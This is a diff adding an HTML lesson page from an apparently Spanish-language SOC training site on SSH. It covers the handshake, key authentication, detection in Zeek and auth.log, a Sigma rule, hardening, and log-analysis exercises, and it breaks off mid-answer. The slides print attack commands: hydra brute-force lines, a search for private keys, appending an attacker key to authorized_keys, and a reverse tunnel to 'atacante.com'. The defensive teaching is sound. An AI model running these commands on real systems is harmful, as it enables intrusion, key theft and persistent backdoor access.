@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SSH — Protocolos SOC</title>
+  <meta name="description" content="SSH: autenticación por clave, tunneling, brute force, key theft y detección en SOC." />
+  <link rel="stylesheet" href="../styles.css" />
+  <link rel="stylesheet" href="../boton-dubstep.css" />
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml" />
+  <style> :root { --proto-color: #00ffcc; } </style>
+  <script>
+    (function(){
+      const t = localStorage.getItem('protocolos-soc-theme') || 'vision-ui';
+      document.documentElement.setAttribute('data-theme', t);
+    })();
+  </script>
+</head>
+<body class="page-wrapper">
+
+  <header class="site-header">
+    <div class="container">
+      <a href="../index.html" class="site-logo">
+        <span class="logo-icon">🛡️</span>
+        <span>Protocolos<span class="accent">SOC</span></span>
+      </a>
+      <nav class="header-nav">
+        <a href="https://github.com/xavimape/protocolos-red-soc" target="_blank" rel="noopener" data-i18n="nav.github">GitHub</a>
+      </nav>
+      <div class="ui-controls">
+        <a href="../index.html" class="back-to-hub">
+          <span class="back-arrow">←</span>
+          <span data-i18n="nav.back">Volver al Hub</span>
+        </a>
+        <select class="theme-select" id="theme-select" title="Cambiar tema"></select>
+        <button class="ctrl-btn" id="lang-toggle" title="Switch to English" onclick="i18n.toggleLang()">EN</button>
+      </div>
+    </div>
+  </header>
+
+  <div class="module-header">
+    <div class="container">
+      <div class="module-breadcrumb">
+        <a href="../index.html">Hub</a>
+        <span class="sep">›</span>
+        <span>SSH</span>
+      </div>
+      <div class="module-title-row">
+        <div class="module-number-badge">8</div>
+        <div>
+          <div class="module-title">SSH</div>
+          <div class="module-subtitle" data-i18n="ssh.subtitle">Secure Shell · TCP/22 · Capa de Aplicación</div>
+        </div>
+      </div>
+      <nav class="tabs-nav">
+        <button class="tab-btn active" data-tab="demo"       onclick="SOC.switchTab('ssh','demo')">       <span data-i18n="tab.demo">🧪 Demo Lab</span></button>
+        <button class="tab-btn"        data-tab="teoria"     onclick="SOC.switchTab('ssh','teoria')">     <span data-i18n="tab.teoria">📖 Teoría</span></button>
+        <button class="tab-btn"        data-tab="ejercicios" onclick="SOC.switchTab('ssh','ejercicios')"> <span data-i18n="tab.ejercicios">✏️ Ejercicios</span></button>
+        <button class="tab-btn"        data-tab="recursos"   onclick="SOC.switchTab('ssh','recursos')">   <span data-i18n="tab.recursos">📚 Recursos</span></button>
+      </nav>
+    </div>
+  </div>
+
+  <main class="container">
+
+    <!-- ── Tab: Demo Lab ── -->
+    <div class="tab-content active" data-tab="demo">
+
+      <!-- Demo 1: Autenticación SSH -->
+      <div class="demo-container">
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title" data-i18n="ssh.demo.auth.title">Autenticación SSH — Password vs Clave pública</span>
+            <span class="badge badge-success">TCP/22</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-input-group">
+              <label data-i18n="ssh.demo.auth.server">Servidor SSH:</label>
+              <input type="text" id="ssh-server" value="prod-server-01" />
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="ssh.demo.auth.user">Usuario:</label>
+              <input type="text" id="ssh-user" value="admin" />
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="ssh.demo.auth.method">Método de autenticación:</label>
+              <select id="ssh-auth">
+                <option value="password">Password (vulnerable)</option>
+                <option value="key" selected data-i18n="ssh.opt1">Clave pública (recomendado)</option>
+                <option value="mfa">Password + MFA / 2FA</option>
+              </select>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="sshDemo.runAuth()" data-i18n="ssh.demo.btn.auth">▶ Simular autenticación</button>
+              <button class="btn btn-secondary" onclick="sshDemo.reset()" data-i18n="btn.reset">↺ Reset</button>
+            </div>
+          </div>
+        </div>
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title" data-i18n="ssh.demo.auth.output">Handshake y autenticación SSH</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-output" id="ssh-auth-output">
+              <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="ssh.demo.waiting">Esperando simulación SSH...</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 2: SSH Tunneling -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="ssh.demo.tunnel.title">🚇 Demo: SSH Tunneling — Bypass de controles de red</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="ssh.demo.tunnel.desc">
+          SSH permite crear túneles cifrados que encapsulan otro tráfico. Esto es legítimo para acceso seguro, pero los atacantes lo abusan para exfiltrar datos o saltarse firewalls/proxies corporativos.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ssh.demo.tunnel.panel">Configurar túnel</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="ssh.demo.tunnel.type">Tipo de túnel:</label>
+                <select id="tunnel-type">
+                  <option value="local" data-i18n="ssh.opt2">Local forwarding (-L) — acceso a recursos internos</option>
+                  <option value="remote" data-i18n="ssh.opt3">Remote forwarding (-R) — acceso externo al interior</option>
+                  <option value="dynamic" selected>Dynamic forwarding (-D) — SOCKS proxy</option>
+                </select>
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="ssh.demo.tunnel.jump">Servidor SSH jump:</label>
+                <input type="text" id="tunnel-jump" value="bastion.empresa.com" />
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="sshDemo.runTunnel()" data-i18n="ssh.demo.btn.tunnel">▶ Simular tunneling</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ssh.demo.tunnel.output">Análisis del túnel</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="ssh-tunnel-output" style="min-height:200px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="ssh.demo.waiting">Esperando simulación SSH...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 3: Brute Force SSH -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="ssh.demo.brute.title">⚔️ Demo: Brute Force + Reconocimiento</div>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ssh.demo.brute.panel">Configurar ataque</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="ssh.demo.brute.target">Objetivo:</label>
+                <input type="text" id="brute-target" value="192.168.1.10" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="ssh.demo.brute.type">Tipo:</label>
+                <select id="brute-type">
+                  <option value="brute" selected>Brute force (Hydra)</option>
+                  <option value="scan">SSH version scan (nmap)</option>
+                  <option value="key">SSH key theft (post-compromise)</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="sshDemo.runBrute()" data-i18n="ssh.demo.btn.brute">▶ Simular</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ssh.demo.brute.output">Resultado</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="ssh-brute-output" style="min-height:200px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="ssh.demo.waiting">Esperando simulación SSH...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- Demo 4: SSH Key Theft -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="ssh.demo.keytheft.title">🗝️ Demo: SSH Key Theft — Robo de claves privadas</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="ssh.demo.keytheft.desc">
+          Tras comprometer un sistema, el atacante busca claves SSH privadas para moverse lateralmente sin contraseñas. Una clave sin passphrase permite acceso inmediato a todos los servidores donde esté en authorized_keys.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ssh.demo.keytheft.panel">Simular robo de claves</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="ssh.demo.keytheft.victim">Sistema comprometido:</label>
+                <input type="text" id="keytheft-victim" value="dev-workstation-01" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="ssh.demo.keytheft.stage">Fase del ataque:</label>
+                <select id="keytheft-stage">
+                  <option value="search" selected data-i18n="ssh.opt4">Búsqueda de claves privadas</option>
+                  <option value="exfil" data-i18n="ssh.opt5">Exfiltración y uso de clave robada</option>
+                  <option value="persist" data-i18n="ssh.opt6">Persistencia (agregar clave a authorized_keys)</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="sshDemo.runKeyTheft()" data-i18n="ssh.demo.btn.keytheft">▶ Simular Key Theft</button>
+                <button class="btn btn-secondary" onclick="sshDemo.reset()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ssh.demo.keytheft.result">Resultado</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="keytheft-output" style="min-height:200px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="ssh.demo.waiting">Esperando simulación SSH...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /tab demo -->
+
+    <!-- ── Tab: Teoría ── -->
+    <div class="tab-content" data-tab="teoria">
+      <div class="slides-container" id="ssh-slides">
+
+        <div class="slide active">
+          <span class="slide-number">1 / 8</span>
+          <h2 data-i18n="ssh.s1.title">¿Qué es SSH?</h2>
+          <p class="slide-subtitle" data-i18n="ssh.s1.sub">El reemplazo seguro de Telnet, rsh y rlogin</p>
+          <p data-i18n="ssh.s1.p1">SSH (Secure Shell) es un protocolo criptográfico para operar servicios de red de forma segura sobre redes no confiables. Reemplazó a Telnet (texto claro) en 1995. Proporciona acceso remoto seguro, transferencia de archivos (SFTP/SCP), y tunneling.</p>
+          <div class="callout success">
+            <strong data-i18n="ssh.s1.uses.title">Usos legítimos de SSH:</strong>
+            <ul style="margin-top:0.5rem;">
+              <li data-i18n="ssh.s1.u1">🖥️ Administración remota de servidores Linux/Unix</li>
+              <li data-i18n="ssh.s1.u2">📁 Transferencia segura de archivos (SFTP, SCP)</li>
+              <li data-i18n="ssh.s1.u3">🚇 Tunneling de puertos y SOCKS proxy</li>
+              <li data-i18n="ssh.s1.u4">🔑 Autenticación con clave pública/privada sin contraseña</li>
+              <li data-i18n="ssh.s1.u5">🔒 Git sobre SSH (GitHub, GitLab, Bitbucket)</li>
+            </ul>
+          </div>
+          <div class="callout danger" style="margin-top:1rem;">
+            <strong data-i18n="ssh.s1.abuses.title">Abusos de SSH por atacantes:</strong>
+            <ul style="margin-top:0.5rem;">
+              <li data-i18n="ssh.s1.a1">💥 Brute force de contraseñas (servicio expuesto a Internet)</li>
+              <li data-i18n="ssh.s1.a2">🔑 Robo de claves privadas SSH para acceso persistente</li>
+              <li data-i18n="ssh.s1.a3">📡 Tunneling para exfiltrar datos o saltar controles de red</li>
+              <li data-i18n="ssh.s1.a4">🌐 C2 (Command &amp; Control) sobre SSH cifrado</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">2 / 8</span>
+          <h2 data-i18n="ssh.s2.title">Handshake y cifrado SSH</h2>
+          <p class="slide-subtitle" data-i18n="ssh.s2.sub">Negociación de algoritmos y establecimiento de canal cifrado</p>
+          <pre data-i18n="ssh.pre0">
+FASES DEL HANDSHAKE SSH:
+
+1. TCP CONNECT (cliente → servidor, TCP/22)
+
+2. BANNER EXCHANGE:
+   Servidor → "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3"
+   Cliente  → "SSH-2.0-OpenSSH_9.1"
+   ⚠ El banner revela versión → buscar CVEs específicos
+
+3. KEY EXCHANGE (SSH_MSG_KEXINIT):
+   Negociación de algoritmos:
+   - Key exchange: ecdh-sha2-nistp256, diffie-hellman-group14-sha256
+   - Cifrado:      aes256-gcm@openssh.com, chacha20-poly1305
+   - MAC:          hmac-sha2-256, umac-128
+   - Compresión:   none, zlib@openssh.com
+
+4. SERVER HOST KEY VERIFICATION:
+   Servidor presenta su clave pública (Ed25519/ECDSA/RSA)
+   Cliente verifica contra ~/.ssh/known_hosts
+   ⚠ Primera conexión: "The authenticity of host can't be established"
+   Si alguien acepta sin verificar → TOFU sin validación real
+
+5. DIFFIE-HELLMAN KEY AGREEMENT:
+   Genera session key sin transmitirla (forward secrecy)
+
+6. AUTENTICACIÓN del usuario:
+   a) Password: contraseña enviada CIFRADA (a diferencia de FTP)
+   b) Public key: cliente firma con su clave privada → servidor verifica con pública
+   c) GSSAPI/Kerberos: integración con AD
+
+Todo el canal desde aquí: CIFRADO con la session key</pre>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">3 / 8</span>
+          <h2 data-i18n="ssh.s3.title">Autenticación por clave pública</h2>
+          <p class="slide-subtitle" data-i18n="ssh.s3.sub">El estándar de oro — más seguro que contraseñas</p>
+          <pre data-i18n="ssh.pre1">
+GENERACIÓN DE PAR DE CLAVES:
+  ssh-keygen -t ed25519 -C "admin@empresa.com"
+  → Genera: ~/.ssh/id_ed25519       (clave privada — NUNCA compartir)
+            ~/.ssh/id_ed25519.pub   (clave pública — se distribuye)
+
+INSTALACIÓN DE CLAVE PÚBLICA EN SERVIDOR:
+  ssh-copy-id -i ~/.ssh/id_ed25519.pub admin@servidor
+  → Agrega la clave al servidor: /home/admin/.ssh/authorized_keys
+
+TIPOS DE CLAVES (de mejor a peor):
+  Ed25519 ✅ — más seguro, más rápido, clave pequeña (256 bits)
+  ECDSA   ✅ — bueno, ampliamente compatible
+  RSA     ⚠  — funciona pero necesita ≥4096 bits para ser seguro hoy
+  DSA     ✖  — ROTO, no usar (max 1024 bits)
+
+FLUJO DE AUTENTICACIÓN POR CLAVE PÚBLICA:
+  1. Cliente: "quiero autenticar con mi clave pública Ed25519 xyz..."
+  2. Servidor: verifica que xyz está en authorized_keys
+  3. Servidor: genera challenge random, lo cifra con la clave pública xyz
+  4. Cliente: descifra el challenge con su clave PRIVADA → responde
+  5. Servidor: verifica la respuesta → autenticación exitosa
+
+VENTAJA DE SEGURIDAD:
+  → La clave privada NUNCA viaja por la red
+  → Sin contraseña no hay nada que interceptar ni bruteforcear
+  → Con passphrase en la clave privada: 2FA implícito
+  → Con ssh-agent: un solo unlock de la clave por sesión</pre>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">4 / 8</span>
+          <h2 data-i18n="ssh.s4.title">Ataque 1: Brute Force SSH</h2>
+          <p class="slide-subtitle" data-i18n="ssh.s4.sub">El ataque más común contra SSH expuesto a Internet</p>
+          <p data-i18n="ssh.s4.p1">Cualquier servidor SSH expuesto a Internet recibe intentos de brute force en minutos. Los atacantes usan credenciales comunes (root/toor, admin/admin) y listas de contraseñas filtradas de breaches.</p>
+          <pre data-i18n="ssh.pre2">
+ESCALA REAL: Un servidor SSH expuesto a Internet recibe
+  ~100-1000 intentos de login por hora de bots automatizados.
+  → En 24h: hasta 24.000 intentos desde decenas de IPs distintas
+
+HERRAMIENTAS COMUNES:
+  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+  medusa -h target -u admin -P passwords.txt -M ssh -t 4
+  ncrack -p 22 --user root -P top10k.txt target
+
+DETECCIÓN en /var/log/auth.log:
+  Jun 25 03:14:01 server sshd[1234]: Failed password for root from 1.2.3.4 port 51234 ssh2
+  Jun 25 03:14:02 server sshd[1234]: Failed password for root from 1.2.3.4 port 51235 ssh2
+  [... ×200 en 60 segundos ...]
+  Jun 25 03:15:44 server sshd[1234]: Accepted password for admin from 1.2.3.4 port 51512 ssh2
+
+DETECCIÓN en Zeek ssh.log:
+  ts    id.orig_h     id.resp_h    auth_success  client      server
+  ...   1.2.3.4       10.0.0.10    false         OpenSSH_8.4 OpenSSH_8.9p1
+  [200 entradas con auth_success=false, luego una con true]
+
+MITIGACIONES:
+  1. Deshabilitar login por contraseña: PasswordAuthentication no
+  2. Fail2ban o similar: ban automático tras N fallos
+  3. Cambiar puerto (oscuridad, reduce ruido)
+  4. AllowUsers — lista blanca de usuarios permitidos
+  5. Solo auth por clave pública</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1110.001</strong> — Brute Force · <strong>T1021.004</strong> — Remote Services: SSH</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">5 / 8</span>
+          <h2 data-i18n="ssh.s5.title">Ataque 2: SSH Key Theft</h2>
+          <p class="slide-subtitle" data-i18n="ssh.s5.sub">Robar claves privadas — acceso permanente sin contraseñas</p>
+          <p data-i18n="ssh.s5.p1">Una vez que un atacante compromete un sistema, su primer objetivo es las claves SSH privadas. Con ellas, el atacante puede moverse lateralmente sin contraseñas y de forma silenciosa.</p>
+          <pre data-i18n="ssh.pre3">
+UBICACIONES DE CLAVES PRIVADAS SSH:
+  ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.ssh/id_ecdsa
+  /root/.ssh/id_*   ← acceso root expone todas las claves
+  /home/*/.ssh/id_* ← afecta a todos los usuarios
+
+BÚSQUEDA DE CLAVES DURANTE POST-EXPLOITATION:
+  find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
+  grep -r "BEGIN.*PRIVATE KEY" /home /root /etc 2>/dev/null
+
+MOVIMIENTO LATERAL CON CLAVE ROBADA:
+  ssh -i stolen_id_rsa admin@servidor-prod-02
+  → Acceso inmediato sin contraseña
+  ssh -i stolen_id_rsa ubuntu@bastion.empresa.com
+  → Pivoting: desde bastion atacar hosts internos
+
+PERSISTENCIA: Agregar clave propia del atacante a authorized_keys
+  echo "ssh-ed25519 AAAA...atacante... " >> ~/.ssh/authorized_keys
+  → El admin no nota nada (hay múltiples claves)
+  → El atacante sigue teniendo acceso aunque cambie su contraseña
+
+DETECCIÓN:
+  git diff / inotifywait en ~/.ssh/authorized_keys
+  SIEM: alerta si se modifica authorized_keys fuera de ventana de cambios
+  Zeek ssh.log: mismo usuario conectándose desde múltiples IPs/países
+  → Imposible viajar Berlín→Buenos Aires en 5 min → cuenta comprometida</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1552.004</strong> — Private Keys · <strong>T1098.004</strong> — Account Manipulation: SSH Authorized Keys</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">6 / 8</span>
+          <h2 data-i18n="ssh.s6.title">Ataque 3: SSH Tunneling como C2</h2>
+          <p class="slide-subtitle" data-i18n="ssh.s6.sub">Exfiltración y C2 oculto dentro de SSH cifrado</p>
+          <pre data-i18n="ssh.pre4">
+TIPOS DE SSH TUNNELING:
+
+LOCAL FORWARDING (-L):
+  ssh -L 8080:db-interno:5432 user@bastion.empresa.com
+  Atacante accede a localhost:8080 → tráfico va cifrado a través del bastion
+  → Accede a db-interno:5432 como si estuviera dentro de la red
+
+REMOTE FORWARDING (-R):
+  ssh -R 9001:localhost:22 user@atacante.com
+  → El servidor del atacante expone el puerto 9001
+  → Conectar a atacante.com:9001 → llega al SSH de la víctima
+  → Backdoor: la víctima inicia la conexión (sale del firewall)
+
+DYNAMIC FORWARDING (-D) — SOCKS PROXY:
+  ssh -D 1080 user@bastion.empresa.com
+  → Configura proxy SOCKS5 en localhost:1080
+  → Todo el tráfico del navegador va cifrado por el túnel SSH
+  → Atacante navega por la red interna como si estuviera adentro
+
+C2 SOBRE SSH:
+  → Muchos malwares usan SSH reverso para Command & Control
+  → El tráfico parece SSH legítimo (TCP/22, cifrado)
+  → Difícil de distinguir de administración legítima
+
+DETECCIÓN DE TUNNELING ABUSIVO:
+  Zeek ssh.log: sesiones SSH muy largas con alto throughput
+    duration > 3600s + orig_bytes > 100MB → sospechoso
+  Conexiones SSH salientes desde workstations (no deberían hacer SSH saliente)
+  NetFlow: ssh a IPs externas desconocidas desde hosts de usuarios</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1572</strong> — Protocol Tunneling · <strong>T1048</strong> — Exfiltration Over Alternative Protocol</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">7 / 8</span>
+          <h2 data-i18n="ssh.s7.title">SSH en telemetría SOC</h2>
+          <p class="slide-subtitle" data-i18n="ssh.s7.sub">Zeek ssh.log + auth.log — los dos logs clave para SSH</p>
+          <pre data-i18n="ssh.pre5">
+# Zeek ssh.log — campos principales
+ts     uid  id.orig_h    id.resp_h    auth_success  direction  client           server
+10:01  X1   1.2.3.4      10.0.0.10    false         INBOUND    OpenSSH_8.4      OpenSSH_8.9p1
+...    ×200 auth_success=false ...
+10:05  X1   1.2.3.4      10.0.0.10    true           INBOUND    OpenSSH_8.4      OpenSSH_8.9p1
+
+# /var/log/auth.log (Linux) / /var/log/secure (RHEL)
+Jun 25 10:05:01 host sshd: Failed password for root from 1.2.3.4 port 45123 ssh2
+Jun 25 10:05:22 host sshd: Accepted publickey for admin from 10.0.0.50 port 52000 ssh2 \
+  RSA SHA256:abc...
+
+# IOC 1: Brute force
+  Muchos "Failed password" desde misma IP en corto tiempo
+  Sigma: count(Failed password) by src_ip > 20 in 60s
+
+# IOC 2: Impossible travel / credencial comprometida
+  Mismo usuario, auth exitosa desde país A y país B con pocas horas de diferencia
+
+# IOC 3: Nuevo país / nueva IP para usuario conocido
+  admin siempre se conecta desde 10.0.0.x (VPN) → alerta si lo hace desde 185.x.x.x
+
+# IOC 4: Tunneling activo
+  Zeek: duration > 1h + orig_bytes > 50MB para una conexión SSH
+
+# Sigma regla — SSH brute force
+title: SSH Brute Force
+logsource:
+  product: linux
+  service: auth
+detection:
+  selection: "Failed password"
+  condition: selection | count() by src_ip > 20
+  timeframe: 60s
+level: medium</pre>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">8 / 8</span>
+          <h2 data-i18n="ssh.s8.title">Hardening SSH — configuración segura</h2>
+          <p class="slide-subtitle" data-i18n="ssh.s8.sub">Configuración mínima de seguridad para sshd_config</p>
+          <ul>
+            <li>🔑 <strong data-i18n="ssh.s8.h1">Solo clave pública</strong>: <code>PasswordAuthentication no</code> · <code>PubkeyAuthentication yes</code></li>
+            <li>🚫 <strong data-i18n="ssh.s8.h2">Sin login root</strong>: <code>PermitRootLogin no</code></li>
+            <li>👤 <strong data-i18n="ssh.s8.h3">Lista blanca de usuarios</strong>: <code>AllowUsers admin deploy</code></li>
+            <li>⏱ <strong data-i18n="ssh.s8.h4">Timeout de autenticación</strong>: <code>LoginGraceTime 20</code></li>
+            <li>📋 <strong data-i18n="ssh.s8.h5">Logging máximo</strong>: <code>LogLevel VERBOSE</code></li>
+            <li>🔒 <strong data-i18n="ssh.s8.h6">Algoritmos fuertes solamente</strong>: deshabilitar MD5, SHA1, DES</li>
+            <li>🛡️ <strong data-i18n="ssh.s8.h7">Fail2ban</strong>: ban automático tras 5 fallos en 10 minutos</li>
+            <li>🌐 <strong data-i18n="ssh.s8.h8">Firewall + VPN</strong>: TCP/22 no debería ser público — solo desde VPN o IP fija</li>
+          </ul>
+          <pre style="margin-top:1rem;" data-i18n="ssh.pre6">
+# sshd_config — configuración mínima segura
+Protocol 2
+Port 22
+PermitRootLogin no
+PasswordAuthentication no
+PubkeyAuthentication yes
+AuthorizedKeysFile .ssh/authorized_keys
+LoginGraceTime 20
+MaxAuthTries 3
+AllowUsers admin deploy
+LogLevel VERBOSE
+X11Forwarding no
+AllowTcpForwarding no    # deshabilitar tunneling si no es necesario
+GatewayPorts no
+KexAlgorithms curve25519-sha256,ecdh-sha2-nistp256
+Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com</pre>
+        </div>
+
+      </div>
+      <div class="slides-nav">
+        <button class="btn btn-secondary btn-prev" disabled data-i18n="btn.prev">← Anterior</button>
+        <div class="slides-progress"></div>
+        <button class="btn btn-primary btn-next" data-i18n="btn.next">Siguiente →</button>
+      </div>
+    </div><!-- /tab teoria -->
+
+    <!-- ── Tab: Ejercicios ── -->
+    <div class="tab-content" data-tab="ejercicios">
+      <div class="ejercicios-list">
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-01</span>
+            <span class="ejercicio-title" data-i18n="ssh.ej1.title">Analizar auth.log — ¿brute force exitoso?</span>
+            <span class="ejercicio-difficulty dif-easy" data-i18n="ej.easy">Fácil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ssh.ej1.q">Analizá este extracto de /var/log/auth.log. Determiná si hubo un brute force exitoso, cuándo ocurrió y qué deberías hacer:</p>
+            <pre data-i18n="ssh.pre7">
+Jun 25 04:10:01 webserver sshd[2201]: Failed password for root from 185.220.101.5 port 44001 ssh2
+Jun 25 04:10:02 webserver sshd[2201]: Failed password for root from 185.220.101.5 port 44002 ssh2
+[... 89 líneas similares con root, admin, ubuntu, operator ...]
+Jun 25 04:11:44 webserver sshd[2201]: Failed password for deploy from 185.220.101.5 port 44093 ssh2
+Jun 25 04:11:47 webserver sshd[2201]: Accepted password for deploy from 185.220.101.5 port 44094 ssh2
+Jun 25 04:11:49 webserver sshd[2201]: pam_unix(sshd:session): session opened for user deploy
+Jun 25 04:15:22 webserver sshd[2201]: pam_unix(sshd:session): session closed for user deploy</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+ANÁLISIS: Sí — brute force exitoso
+
+TIMELINE:
+  04:10:01 — Inicio del brute force desde 185.220.101.5
+  ~92 intentos fallidos en ~1min 46seg (usuarios: root, admin, ubuntu, operator, deploy)
+  04:11:47 — "Accepted password for deploy" ← ÉXITO
+  04:11:49 — Sesión SSH abierta para usuario "deploy"
+  04:15:22 — Sesión cerrada (3 minutos y 33 segundos de actividad)
+
+IOCs:
+  1. 185.220.101.5 es un nodo de salida de Tor — alta probabilidad de atacante anónimo
+  2. 92 intentos en <2 minutos → tasa típica de herramienta automatizada (Hydra/Medusa)
+  3. Usuario comprometido: deploy (usuario de CI/CD — acceso peligroso)
+  4. Sin Fail2ban/rate limiting → 92 intentos sin bloqueo
+  5. PasswordAuthentication=yes → debería estar deshabilitado
+
+ACTIVIDAD ENTRE 04:11:49 y 04:15:22 (3min 33s):
+  El atacante tuvo acceso como 'deploy'. ¿Qué hizo?
+  → Revisar bash_history: /home/deploy/.bash_history
+  → Revisar comandos con audit: ausearch -ua deploy -ts recent
+  → Ver qué procesos se lanzaron: ps aux snapshot, revisar /proc
+  → El usuario 'deploy' puede tener permisos para deployar código
+    o acceder a credenciales de CI/CD (secretos, API keys)
+
+ACCIONES INMEDIATAS:
+  1. Deshabilitar cuenta deploy: passwd -l deploy
+  2. Rotar credenciales de deploy (contraseña, tokens CI/CD, API keys)
+  3. Revisar qué hizo en esos 3 minutos (bash_history, audit logs)
+  4. Bloquear 185.220.101.5 (ya fue, pero bloquear rangos de Tor)
+  5. Deshabilitar PasswordAuthentication en sshd_config
+  6. Configurar Fail2ban
+
+LECCIÓN: deploy es una cuenta de servicio, no debería aceptar auth por contraseña
+ni estar expuesta al SSH público. Idealmente solo desde IPs internas/VPN.
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-02</span>
+            <span class="ejercicio-title" data-i18n="ssh.ej2.title">Detectar SSH tunneling sospechoso en Zeek</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ssh.ej2.q">El SIEM alertó por volumen inusual de datos en SSH. Analizá el Zeek ssh.log + conn.log. ¿Es tunneling legítimo o exfiltración?</p>
+            <pre data-i18n="ssh.pre8">
+Zeek ssh.log:
+  ts       uid  id.orig_h       id.resp_h       direction  auth_success  duration  orig_bytes   resp_bytes
+  09:00:01 A1   10.0.0.55       github.com:22   OUTBOUND   true          7200s     245 MB       2 MB
+  09:00:05 A2   10.0.0.55       34.122.87.5:22  OUTBOUND   true          7199s     312 MB       1.5 MB
+  09:00:10 A3   10.0.0.55       45.33.32.156:22 OUTBOUND   true          7198s     198 MB       800 KB
+
+Contexto:
+  10.0.0.55 = workstation de mgarcia (developer)
+  github.com = legítimo (uso esperado)
+  34.122.87.5 = DigitalOcean (VPS, no en lista de servidores de la empresa)
+  45.33.32.156 = Linode/Akamai (VPS, no en lista)
+  Hora: 09:00 - 11:00 (horario laboral normal)
+  orig_bytes >> resp_bytes → la workstation ENVÍA más de lo que recibe</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+ANÁLISIS:
+
+CONEXIÓN A1 (github.com:22):
+  → Legítima: git push/pull, acceso a repositorios
+  → 245MB en 2h podría ser git clone de repositorios grandes
+  → orig_bytes >> resp_bytes (subiendo más que bajando)
+  → SOSPECHOSO: 245MB de push es mucho, pero podría ser git lfs
+  → Investigar: ¿qué repositorios? ¿es normal para mgarcia?
+
+CONEXIONES A2 y A3 (VPS externos no corporativos):
+  → ❌ NO LEGÍTIMAS — no están en lista de servidores aprobados
+  → Patrón: 3 conexiones SSH simultáneas, todas con duración ~2h
